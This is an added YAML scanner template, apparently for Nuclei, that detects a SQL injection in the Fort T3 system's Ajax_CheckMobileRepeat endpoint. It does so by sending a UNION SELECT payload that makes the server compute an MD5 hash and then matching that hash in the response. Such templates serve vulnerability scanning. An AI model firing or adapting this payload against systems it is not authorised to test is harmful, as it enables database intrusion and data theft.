@@ -1,0 +1,34 @@
+id: poc-yaml-fort-t3-system-ajax-checkmobilerepeat-sqli
+info:
+  name: 要塞T3系统 Ajax_CheckMobileRepeat SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/T3/Ajax/Ajax_CheckMobileRepeat.ashx?action=checkmobilerepeat&mobileNum=1%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20sys.fn_varbintohexstr%28hashbytes%28'MD5','{{t1}}'%29%29%29--%20aEdt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "type='text'"
+          - "id='operinfo'"
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<html>"
+        negative: true
